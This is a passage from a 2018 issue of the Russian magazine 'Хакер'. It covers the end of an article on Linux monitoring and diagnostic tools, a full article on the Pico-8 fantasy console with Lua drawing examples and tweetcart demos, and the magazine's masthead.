
                                    top





                                   htop

Первые две колонки оче видны:
 • PID — идентификатор процесса;
 • User — пользователь, от которого он запущен.

А вот две следующие чуть интересней: Priority и Niceness, причем первая
в общем случае равна второй + 20. По сути, Priority показы вает абсолютное
значение приоритета про цес са в ядре, а Niceness показывает значение отно‐
сительно ноля (ноль обычно наз начается по умолчанию). Этот самый приори‐
тет учитывается при выдаче про цес су квантов процессорного времени,
поэтому, формально говоря, при увеличении приоритета командой renice
можно заставить какую‐нибудь сильно CPU‐bound задачу выполняться чуточ‐
ку быстрее. Для процессов реального времени в колонке Priority будет стоять
rt, то есть real time, «как только — так сра зу».
   Дальше следуют данные о памяти:
 • VIRT — виртуальная память, «обещанная» про цес су системой;
 • RES — фактически используемая память (кстати, благодаря механизму
   copy‐on‐write может быть нес колько (N) форков одного и того же процес са
   с одним и тем же числом M в этой колонке, что вовсе не значит, что сож‐
   рано N*M памяти, потому что они разделяют ее между собой);
 • SHR — shared memory, то есть память, которая потенциально может
   использоваться для межпроцессного вза имодействия.

Ну и совсем базовые показа тели:
 • CPU% — сколько процентов CPU жрет процесс; легко может быть боль‐
  ше 100%, если параллелится на нес колько ядер;
 • MEM% — процент памяти, потребляемой процессом;
 • TIME+ — сколько времени процесс бежит;
 • COMMAND — какая команда (программа + аргу менты) запущена.

Но мы же хотим идти еще глубже, надо больше подробностей!


$ vmstat 1





Здесь тоже много колонок, для прос тоты взглянем на четыре:
 •  r — размер очереди процессов на дос туп к памяти;
 • b — число процессов в uninterruptible sleep;
 • si/so — сколько страниц памяти в текущий момент пишется в своп / чита‐
   ется из свопа.

Надо ли явно подчеркивать, что в идеальном мире в них должны быть ноли?


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
  НАДЗИРАЙ И ВЛАСТВУЙ
                  КАК УЗНАТЬ ВСЕ, ЧТО ПРОИСХОДИТ
                     С ТВОЕЙ LINUX‐МАШИНОЙ





ГДЕ ХРАНИТЬ КОЛЛЕКЦИЮ ЛЮТНЕВОЙ МУЗЫКИ
Если ты хоть раз размечал диск руками (например, при установке Arch Linux),
то наверняка знаешь о существовании утилиты fdisk. С ее помощью проще
всего посмотреть разделы на этом самом диске:


$ sudo fdisk ‐l





Есть ее более развесис тая вер сия с псевдографическим интерфейсом,
называется cfdisk, а также еще пара утилит, которые, на первый взгляд, дела‐
ют весьма похожие вещи — поз воляют управлять разделами на дисках.
Это parted (к которому, кста ти, есть неплохой GUI на GTK в лице gparted)
и gdisk. Наличие такого зоопарка свя зано с тем, что существу ет несколько
вариантов структурирования разделов на диске, и исторически для разных
вариантов использовались раз ные программы. Наверняка ты уже встречал
такие аббревиатуры, как MBR и GPT. Я не буду подробно останавливаться
на различиях, но почитать можно, например, в статье «Сравнение структур
разделов GPT и MBR». Там оно обсужда ется с позиции настройки Windows,
но суть от этого не меня ется. И да, в современном же мире fdisk уже уме ет
работать с обоими вариантами, как и parted, поэтому выбирать можно исклю‐
чительно из личных предпочтений.
  Но вернемся к сбору информации. Мы знаем, какие у нас разделы,
а теперь давай взглянем на дерево файловой системы, точнее, что куда
смонтировано:


$ df ‐h

Как и раньше, ‐h тут отвечает за «человеческий» вывод размеров. Ну и как ты
помнишь, размеры файлов у нас можно посмотреть командой du:


$ du ‐h /path/to/folder

Наверняка  часть  читателей сейчас подума ла: «Ну  что за банальщина,
это даже школьники знают, давай чего пос вежее». Ладно, давай привнесем
реалтайма, как уже делали с оперативкой:


$ iostat ‐xz 1





Эта команда выводит средние зна чения количес тва операций чтения‐записи
для всех блочных устройств в системе, обновляя информацию раз в секунду.
Это больше «железные» параметры, поэтому  есть еще одна команда
для просмотра статистики I/O попроцессно, и она, по аналогии, называется
iotop.


$ sudo iotop





При попытке запуска без прав root она начнет очень мило оправдываться,
что, мол, есть один такой баг CVE‐2011‐2494, который может приводить
к утечке потенциально важных данных от одних пользователей другим,
«поэтому настрой‐ка ты, дру жочек, sudo». Оно и верно.


ПАКЕТЫ БРАТЬ БУДЕТЕ?
Что еще из операций ввода‐вывода у нас оста лось? Правильно, сетевое вза‐
имодействие. Здесь царит та еще чехарда — «официальные» утилиты меня‐
ются от релиза к релизу, что, с одной сто роны, круто, потому что удобств ста‐
новится больше, с другой — надо переучиваться каждый раз.
   Скажем, какой утилитой смотреть существу ющие в системе интерфейсы?
Кто сказал ifconfig? На современных сис темах ifconﬁg, как правило, уже
вообще отсутствует, ибо есть


$ ip a





Вроде  выглядит немного  по‐дру гому,  а вроде  то же  самое.  Кстати,
для управле ния сетевыми мостами из консоли часто необходимо ставить
пакет bridge‐utils. Тогда в консольке появится утилита brctl, с помощью
которой можно будет их просматривать (brctl show), ну и менять. Но иногда
бывает по‐другому. Мне встречался случай, когда бриджи были, а brctl их
не показывал. Оказалось, что для их создания использовал ся Open vSwitch
и кастомный модуль ядра, для нас тройки которого надо взять другую ути‐
литу — ovs‐vsctl. Если вдруг у тебя окружение на OpenStack, где эта штука
активно используется, — может быть полезно.
   Дальше — как насчет таблиц маршрутизации? Как, говоришь, route ‐n?
Нет, мимо. Сейчас чаще используются netstat ‐nr и ip route show. Ну
и самое банальное — как посмотреть открытые порты и процессы, которые
их запросили? Например, вот так:


$ sudo netstat ‐tnlp





Но думаю, ты уже понял, что банальщиной мы ограничиваться не будем.
Давай  посмотрим  теперь  в  реальном  времени,  как  пакеты  бегают
по интерфейсам.


$ sar ‐n DEV 1





Да, sar — это еще одна отличная утилита для мониторинга. Уме ет показывать
не только сетевые операции, но и диски и активность процессора. Почитать
о ней можешь, например, в статье «Простой мониторинг системы с помощью
SAR».
   Также sar позволяет мониторить открытие/закрытие соединений и ретран‐
смиты (это повторные отправки тех же данных, когда сетевое оборудование
сбоит или коннект крайне нестабильный, очень помогает траблшу тить)
в реальном вре мени.


$ sar ‐1 TCP,ETCP 1





Ну и последнее — конечно, по порядку, а не по зна чению — это просмотр
самого сетевого трафика. Чаще всего для этого используют две утилиты: tcp‐
dump и wireshark. Первая — консольная, ей можно, к примеру, запустить
прослушивание на всех интерфейсах и записать трафик в дамп‐файл в фор‐
мате pcap:


$ tcpdump ‐w test.dump

Вторая же — графическая. Из нее можно точно так же запустить прослушива‐
ние, а можно просто открыть в ней готовый файл дампа, слитый с удаленного
сервера. И наслаждаться кра сотой слоев модели OSI (точнее, TCP/IP).





                                 Wireshark


ЕСЛИ ТЕБЯ ОКРУЖИЛИ ДЕМОНЫ — ЛОГИРУЙ ИХ
НЕМЕДЛЕННО!
Один из самых простых и банальных способов проверить, что происходит
в системе, — это посмотреть системные логи. Вот тут можно почитать о том,
какие секреты скрываются в катало ге /var/log и откуда они там берутся.
До недавнего времени основным механизмом записи логов был syslog, точ‐
нее, его относительно современная реализация rsyslog. Она до сих пор
активно используется, если интерес но почитать, где там что, — можно гля‐
нуть, например, сюда.
  А что в авангарде? В современных дистри бути вах Linux на основе systemd
используется свой механизм логирования, которым можно управлять через
утилиту journalctl. Там есть крайне удоб ная филь тра ция по разным парамет‐
рам и прочие плюшки. Ссылка на хороший обзор.
  Сам же  systemd до  сих  пор  оста ется  довольно жарким  топиком
для обсуждения, поскольку «подмина ет» под себя многие устоявши еся инс‐
трументы и предоставляет альтернативы к сущес твующим решениям. Нап‐
ример, как запускать какой‐то процесс регулярно? Crontab? Вовсе не обя‐
зательно, теперь у нас есть systemd timers. А как насчет нас тройки реакций
на системные и «железные» события? В systemd есть поддержка watchdog.
А что там со сме ной корня — старый доб рый chroot? Необязательно, теперь
есть новенький systemd‐nspawn.



ИНФОРМАЦИЯ — ЭТО НОВОЕ ЗОЛОТО
Когда речь идет о компьютерных системах, всегда лучше знать, чем не знать,
особенно в области инжинирин га и инфобезопасности. Наверняка настройка
системы мониторин га с уведомлениями зай мет не очень много времени
и принесет кучу пользы, но возможность зайти руками на удаленный сервер,
из  консоли  за  пару  минут  диагностировать  проблему  и  предложить
решение — это особая уличная магия, которая подвластна далеко не всем.
Хорошо, что у тебя теперь есть набор инстру ментов для подобных фокусов,
верно?
GEEK
      PICO-8

                    ИГРАЕМ И КОДИМ
                    НА ЛЕГЕНДАРНОЙ
                  ПРИСТАВКЕ, КОТОРОЙ
                   НИКОГДА НЕ БЫЛО





                                                                                Егор Доричев
                                                                                        egordorichev@gmail.com





Если ты когда‐нибудь пытался сде лать игру, то знаешь,
как это непросто и как мно го требуется вре мени и сил.
Но так было не всегда. Pico‐8 и другие фэнтезийные рет‐
роконсоли — это попытка вер нуть старые времена, когда
игры делали на коленке и получа ли от этого мак симум удо‐
вольствия. Давай посмотрим на Pico‐8 поближе, разберем‐
ся, что и как делает сообщество, и полюбуемся на красивые
демки, которые умещаются в твит.


Я занимался разработкой игр пос ледние шесть лет, но прошлой зимой
открыл для себя кое‐что удивительное — мир фэнтезийных ретроконсолей.
Если ты не знаешь, что это такое, то представь эмулятор старой приставки
или домашнего компьютера. Ну, например, Super Nintendo или ZX Spectrum.
Теперь представь, что этой машины никогда не сущес твовало и всё, что у нас
есть, — это эмулятор. Добавь к нему встро енный редактор кода, спрайтов,
карт, звуковых эффектов и музыкальный трекер. Готово! Это и есть рецепт
фэнтезийной консоли.





Одна из первых (или даже пер вая) фэнтезийных приставок — это Voxatron.
Но настоящую популярность обрела не она, а ее младший брат — Pico‐8.
Этот проект начинался как редактор кода для Voxatron, но оказался нас только
удачным, что не просто обрел самостоятельность и затмил предшественника,
а перерос в целый феномен. За Pico‐8 последовали и другие фэнтезийные
консоли. В их списке, кстати, есть и мой (проб ный и ныне замороженный)
проект — neko8.


             INFO

                         Pico‐8 стоит 15 долларов, но многие фэнтезий‐
                     ные консоли распространяются бесплатно. Нап‐
                       ример, LIKO‐12 и TIC‐80. Они еще довольно
                      сырые, но если не хочется покупать Pico‐8, то
                       на них можно взглянуть.


При этом Pico‐8 — это не «вещь в себе». Недавно появился замечательный
пример популярной игры, созданной для фэнтезийной консоли и затем
покорившей другие платформы. Эта игра называется Celeste. Ее первую вер‐
сию двое разработчиков написали на Pico‐8 всего за четыре дня. Позже пол‐
ная версия будет выпущена в Steam, портирова на на все современные кон‐
соли и соберет восторжен ные отзывы критиков.





ЛИМИТЫ
Что делает Pico‐8 такой особен ной и чем, если говорить о разработке игр,
она отличается от того же Unity? Как ни странно, лимитами. Консоль ставит
очень жесткие рамки для раз работки. По некото рым характеристикам Pico‐
8 можно срав нить с домаш ним компь ютером восьмидесятых:
 • дисплей 128 на 128 пикселей, поддерживает 16 цве тов;
 • 32 Кбайт памяти;
 • четыре звуковых канала.

С другой стороны, отсутс твие ограничений по производительности и поддер‐
жка Lua в качестве встроенного языка программирования делают Pico‐
8 монстром по сравнению с нас тоящими старыми машинами.
  Но есть и другие лимиты. Один из самых сильных — максимальное
количество токенов, которое сос тавляет 8192. Токен — это термин, пришед‐
ший к нам от разработчиков языков прог рамми рования. Его буквальное зна‐
чение — символ, обознача ющий что‐то. В каж дом язы ке име ется свой набор
токенов, но Pico‐8 считает только числа, слова, круглые, квад ратные и фигур‐
ные скобки (они считаются попарно, то есть строка () име ет в себе два
токена), а также знаки препинания.
  Почему же на нас накладывают такой жес ткий лимит? Он тесно связан
с другим ограничением: картридж не может содержать более 65 тысяч зна‐
ков. И если восемь тысяч токенов еще укладываются в этот лимит, то вот
девять уже могут и не помес титься.
  Но в этом же и огромный плюс, то, за что я так люблю эту маленькую кон‐
соль. Когда тебе приходит ся думать о том, как уместить свою программу
в разрешенные размеры, ты учишься писать оптимальный код и кре ативно
подходить к решению каждой задачи.





Возьмем для примера игру Dank tomB, созданную @krajzeg. Автор умудрился
запихнуть в картридж не только динамическое освещение, но и кучу дру гих
механик, таких как невидимые бло ки, двигающиеся платформы, выключатели,
которые можно активировать на расстоянии...
  Я думаю, стоит уточнить, что Pico‐8 не дает тебе никакого стартового кода.
Ты не можешь подключить никакие библиотеки и все делаешь сам.


НЕБОЛЬШОЕ ПУТЕШЕСТВИЕ ПО PICO-8
Pico‐8 очень проста в обра щении — нужно выучить всего пару команд. Вряд
ли тебя смутит необ ходимость использовать командную строку, а уж встро‐
енные редакторы освоить и того проще. Но все же на всякий случай пройдем‐
ся по основным моментам.
   Итак, предположим, что ты купил Pico‐8 на официальном сайте, скачал
и запустил. Тебя встречает мигающий курсор терминала. Можешь набрать
help, чтобы увидеть пол ный список команд.


Вир туаль ные кар трид жи
Каждый проект хранится на картридже — специаль ном файле. Консоль под‐
держивает два фор мата картриджей — текстовый (.p8) и PNG  (.p8.png).
Во втором случае при прос мотре файла ты увидишь изображение картриджа
и скриншот сохраненной игры, а ее код будет спря тан внутри.





То есть если ты возьмешь вот эту картинку (из версии статьи на сайте) и сох‐
ранишь к себе, то потом ты можешь загрузить ее в Pico‐8 и запустить игру.
   Вот такое вот волшебство стеганографии!


Давай установим несколько демок:


instal_demos
cd /demos
ls


             INFO

                 Любую пап ку можно открыть в файловом менед‐
                     жере за пределами Pico‐8, если написать fold‐
                   er.


В папке с картриджами появится подкаталог demos/, в котором лежат нес‐
колько примеров картриджей. Давай загрузим картридж jelpi.p8.


load jelpi.p8
run

Кстати, чтобы быстро запустить заг руженный картридж, достаточно нажать
Ctrl‐R.





Pico‐8 поддерживает до шес ти кнопок управления, назначение которым зада‐
ет картридж. Обычно это стрелочки, X и Z/C. Чтобы прекратить выполнение
программы на кар тридже, нужно нажать Escape.
   Теперь начинается самое интересное! Давай заглянем «под капот» этого
платформера. Из режима тер минала жмем Escape и попадаем в режим
редактирования загруженного картриджа (чтобы переключиться обратно,
снова жми Escape).





Мы можем изменить здесь всё. Например, в начале есть пара переменных:


‐‐ config: num_players 1 or 2
num_players = 1
corrupt_mode = false
max_actors = 128

Давай изменим значение corrupt_mode на true и запус тим картридж опять!
Ладно, может, не стоило менять эту переменную...
  Этим наши возможности не ограничиваются. Помимо редактора кода,
можно использовать и все остальные — переключай вкладку и уви дишь
спрайты игры, карты, музыку и звуки. Можешь менять всё, что пожелаешь!


PocketCHIP
Несмотря на то что у Pico‐8 нет и не предполагалось физической формы, ее
воплощением  можно  считать  карманную  приставку  PocketCHIP.  Этот
одноплатный компьютер с экраном, контактной кла виатурой и батарейкой
поставляется сразу с Pico‐8, что поз воляет кодить или играть в игры, лежа
на даче в гамаке.





Увы, у создателей PocketCHIP, похоже, какие‐то неурядицы: сначала они
перестали принимать новые заказы, а теперь страница магазина и вовсе
недоступна. Так что заиметь такую штуку сейчас можно разве что на вторич‐
ном рынке. Будем надеяться, что ситуация исправится!





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
              PICO-8
                ИГРАЕМ И КОДИМ НА ЛЕГЕНДАРНОЙ
             ПРИСТАВКЕ, КОТОРОЙ НИКОГДА НЕ БЫЛО





ПРАКТИКА
Хорошо, на чужие картриджи мы пос мотрели, теперь давай придумаем
что‐нибудь свое! Я часто делаю небольшие графические эксперименты, так
что поделюсь примером разработки одного из них.
   Вот что у меня получилось в ито ге.





Теперь разберем, как это было сделано. Чтобы создать новый картридж,
используй команды reboot и save mycart_.
  Давай начнем с простого: в Pico‐8 есть четыре спе циальные функции,
которые будут вызываться в соответс твующих усло виях, если они определе‐
ны:
 • _init вызывается в самом начале, после загрузки кода;
 • _update вызывается каж дый кадр перед _draw, отвечает за логику;
 • _draw вызывается каж дый кадр, отвечает за отрисовку;
 • _update60 — аналог _update, но, если она определе на, картридж будет
   работать на 60 fps (вмес то 30 стандартных).

Остальные полезности можно подсмотреть в этой шпаргалке.
   Вот пример простого картриджа (комментарии на русском, не пытай ся
вставить их в редактор Pico‐8).


function _init()
 ‐‐ инициализируем глобальные переменные
 str="hello, world!"
 t=0
end
function _update()
 t+=0.01 ‐‐ обновляем время
end
function _draw()
 cls() ‐‐ очищает экран
 local y=cos(t)*16+64 ‐‐ высота, на которой будет нарисован текст
 print(str,10,y) ‐‐ печатаем текст
end

Важ ное замечание: тригономет рические функции в  Pico‐8 работают
в диапазоне от нуля до единицы, а не от нуля до пи.


        WWW

                        Тем, кто не знаком с Lua, могу посоветовать
                      замечательную вводную статью Learn Lua in 15
                        Minutes.


Давай применим наши зна ния тригонометрии и заставим точку вращаться
по кругу.


function _draw()
 cls()
 local x=cos(t)*32+64 ‐‐ t — угол, 32 — радиус, 64 — центр
 local y=sin(t)*32+64
 cicrfill(x,y,3,8) ‐‐ 3 — это радиус, 8 — цвет
end





Что это за магическое число 8? Pico‐8 имеет шес тнадцатицветный экран, то
есть никаким RGB и тем более RGBA здесь и не пахнет. Каждому числу
от 0 до 15 соответствует цвет, например 8 — красный.





Одна точка хорошо, а десять лучше! Давай добавим еще:


‐‐ в _init()
cnt=10
‐‐ в _draw()
cls()
for i=1,cnt do
 local a=t+i/cnt ‐‐ угол зависит от времени и i
 local d=32+sin(t+i%2*0.5)*20 ‐‐ пусть радиус будет меняться
 local x=cos(a)*d+64
 local y=sin(a)*d+64
 circfill(x,y,3,8+i%2) ‐‐ добавим чуть‐чуть больше цветов
end

Что за зна ки процента, спросишь ты? Оператор % воз вращает остаток
от деления. Например 4%2 = 0.
  Уже неплохо, так ведь? Что бы не выг лядело так монотонно, будем вращать
красные точки в одну сторону, а желтые — в дру гую.


local m=(i%2==0 and 1 or ‐1)
local a=(t+i/cnt)*m





И все‐таки точки не выглядят так эффектно, как многоугольники. Pico‐
8 рисовать их не умеет, но это и не так сложно исправить. Давай соз дадим
функцию shp(), которая будет принимать координаты фигуры, количество
сторон, радиус, угол поворота и цвет:


function shp(x,y,cn,r,a,c)
 color(c)
 for i=1,cn do
  local an=a+i/cn ‐‐ угол сейчас
  local oan=a+i/cn‐1/cn ‐‐ угол, который был при прошлой вершине
  line(cos(an)*r+x,sin(an)*r+y,
   cos(oan)*r+x,sin(oan)*r+y)
  ‐‐ и уже известный нам способ вращения точки
  ‐‐ функция line(x1,y1,x2,y2,c) рисует линию из точки (x1;y2) в
точку
  ‐‐ (x2;y2) с цветом c
 end
end
‐‐ в _draw()
‐‐ заменим вызов circ() на нашу функцию:
shp(x,y,6‐i%2*2,16,t+i/cnt,8+i%2)
‐‐ количество граней зависит от делимости i
‐‐ ну и добавим чуть‐чуть декора:
local ox,oy=calc((i/cnt+t*2)*m,8)
circ(x+ox,y+oy,4,9+i%2)
‐‐ этот круг будет показывать угол вращения фигуры





Красота! Надеюсь, тебе тоже понравится. Как видишь, было нес ложно. Вот
полная версия кода, слегка оптимизированная и доработанная. Я также
добавил немного других эффектов, но они очень простые, можешь сам
догадаться, как они работают. ;‐)


function _init()
 t=0
 cnt=10
end
function _update()
 t+=0.01
end
function _draw()
 cls()
 for i=1,cnt do
  local m=(i%2==0 and ‐1 or 1)
  local a=(i/cnt+t)*m
  local d=32+sin(t+i%2*0.5)*20
  local x,y=calc(a,d)
  x+=64
  y+=64
  shp(x,y,6‐i%2*2,16,t+i/cnt,8+i%2)
  local ox,oy=calc((i/cnt+t*2)*m,8)
  circ(x+ox,y+oy,4,9+i%2)
 end
end
function calc(a,d)
 return cos(a)*d,sin(a)*d
end
function shp(x,y,cn,r,a,c)
 color(c)
 for i=1,cn do
  local an=a+i/cn
  local oan=a+i/cn‐1/cn
  line(cos(an)*r+x,sin(an)*r+y,
   cos(oan)*r+x,sin(oan)*r+y)
 end
end


TWEET JAM
В комьюнити Pico‐8 существу ет интерес ный формат для создания картрид‐
жей — tweet jam. По сути, код картриджа должен уместиться в 280 знаков
(лимит твиттера, за вычетом тегов #tweetjam и #tweetcart, с которыми обычно
постится код). Поверь мне, в эти триста знаков можно уместить настоящие
произведения искусства! Вот нес колько примеров.





Написана мной.


poke(0x5f2c,7)t=0pat={1,2,4,8,9,10,15,7}cls()function _draw()camera()
for i=1,500 do circ(rnd(64),rnd(64),1,0)end camera(‐64,‐64)t+=0.001
for i=1,130 do a=t+i/5000 x=sin(33*a)*cos(9*a)*64 y=sin(40*a)*sin(7*a
)*64 circfill(x,y,3,pat[mid(0,#pat,flr(i/20))+1])end end





Написана @guerragames.


t=0 ::_:: t+=.001
cls(7) for p=0,1,.0005 do d=.7*p a=d*cos(p*t*8+t*10)+p*sin(t*10)‐t*10
r=p*128 x=r*cos(a) y=r*sin(a) circfill(x+64,y+64,1+.9*sin(p*t+a*t*6),
0) end flip() goto _





Написана @SeanSLeBlanc.


for i=1,16 do pal(i‐1,sub("01289821",i/2,i/2),1)
end cls() ::q:: z=t()/3 y=64 x=64
for i=0,128,.05 do x+=cos(i/30+z*2)*i/128 y+=sin(i/30+z*2)*i/128 circ
(x,y,1,i*(1+sin(i/128+z)/2)*2) end flip() goto q


ИСТОРИЯ PICO-8
Создатель Pico‐8 — Джозеф Уайт, извес тный также по псевдониму zep. Он
родил ся в Новой Зеландии и затем переехал жить в Японию. Когда Уайта
спрашивают, как появился Pico‐8, он обычно начинает рассказ с того, что
в детстве он увлекался программирова нием на компьютере BBC Micro,
который его отец купил для работы.
   «Было что‐то особенное в рисова нии большими красивы ми пикселями
и печати программ на громоз дкой клавиату ре, что‐то, что резонировало
с моим восьмилетним моз гом», — рассказыва ет Уайт. BBC Micro поставлял ся
без софта, если не считать вшитого в ПЗУ BASIC, поэтому для каждого про‐
екта Уайт сам создавал прос тенькие редакторы спрайтов, музыки и уровней.
  До двухтысячных годов раз работка игр так и оста валась для Уай та хобби,
а на жизнь он зарабатывал работой в кафе. В 2004 году Уайт написал прог‐
рамму Lex500, которая внешне напоминала эмулятор Amiga500 и тоже имела
встроенный интерпретатор BASIC. Затем последовал экспе римент с воксель‐
ной графикой, из которо го в 2010 году родился проект Voxatron. Его демонс‐
трация на YouTube вызвала живейший отклик, и Джозеф Уайт отложил все
проекты ради того, чтобы сосредото читься на Voxatron. Пос тепенно он соб‐
рал небольшую команду единомышленников.
  Предполагалось, что Voxatron будет не просто игрой, а редактором,
в котором каждый сможет делать свои игры и передавать другим. Хорошень‐
ко поломав голову, Уайт придумал называть такие игры картриджами. Поз же
эта идея перекочует и в Pico‐8.





Собственно Pico‐8 родился как попытка сделать скриптовый движок Voxatron
на основе Lex500. Затем возникла идея использовать Pico для прототипиро‐
вания будущей вок сельной игры. Именно так в нем появился свой набор
редакторов спрайтов и музыки. Кстати, разрешение 128 на 128 соответству ет
«срезу» объемного уровня Voxatron.
  Другой занятный факт: Pico‐8 наз ван в честь Pico Pico Cafe — заведе ния,
которое Джозеф и его жена Нацуко Уайт откры ли в Токио. Сейчас кафе
по совместительству стало местом для тусовки независимых разработчиков
и офиса Lexaloﬀe — фирмы Уайта, который боль шую часть времени прос то
проводит за одним из столов.
   «Pico‐8 стал минималистичной двумерной дис тилля цией Voxatron», —
пишет Уайт. Последним штрихом, который превратил Pico в законченную
платформу, стал интерпретатор языка Lua. В первых версиях BASIC трансли‐
ровался в Lua и выполнялся на ее виртуальной машине, но позже Уайт решил
от него отказаться вовсе и оста вить только Lua.
   «Наверное, было бы намного проще, если бы я с самого начала спросил
себя, какой должна быть вымышленная консоль. Вместо этого я продирался
через лес расплывчатых идей и лишь потом понял, что то, что я делаю, —
это что‐то вроде приставки», — рассказыва ет Уайт.
  Постепенно вык ристаллизовалось и понимание более широкого контек‐
ста. Пожалуй, главный урок здесь заключа ется в том, что ограничения плат‐
формы неизменно влияют на то, какими получатся игры. «Точно так же,
как игры для старых компьютеров имели определенный внешний вид и давали
определенные ощущения, — рас суждает Уайт, — платформа может сама
стать объектом дизайна и определять особенности игр, созданных на ней».
 — Андрей Письменный по мотивам статьи Джозефа Уайта в Pico‐8 Fanzine



ИТОГ
Для меня Pico‐8 — один из главных инстру ментов разработки. Консоль поз‐
воляет мне быстро воплотить в жизнь идеи и зас тавляет меня всегда думать
об оптимизации. Я очень рекомендую и активно использую Pico‐8 для игро‐
вых джемов (game jams), она идеальна для таких ивентов, как Ludum Dare.


        WWW

                  •Официальный сайт
                       •API
                       •Твиттер разработ чика Pico‐8
                  •Форум и картриджи
                       •Tweet Jam
   №03 (228)
             Илья Русанен          Алексей Глазков       Андрей Письменный
              Глав ный редактор       Выпускающий редактор         Шеф‐редак тор
                rusanen@glc.ru               glazkov@glc.ru             pismenny@glc.ru
                                 Евгения Шарипо ва
                                     Литературный редактор


                           РЕ ДАК ТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен          Александр «Dr.»
               pismenny@glc.ru             rusanen@glc.ru            Лозовский
                                                                           lozovsky@glc.ru
                  aLLy              Ев гений Зобнин        Антон «ant» Жуков
            iam@russiansecurity.expert          zobnin@glc.ru               zhukov@glc.ru


                          MEGANEWS
                           Мария Нефёдова
                                     nefedova.maria@gameland.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕК ЛАМА

                                  Анна Яков лева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по подписке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Друж бы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколам ское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязательно сов пада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редак ция
не несет ответственности за содер жание рекламных объ явлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2018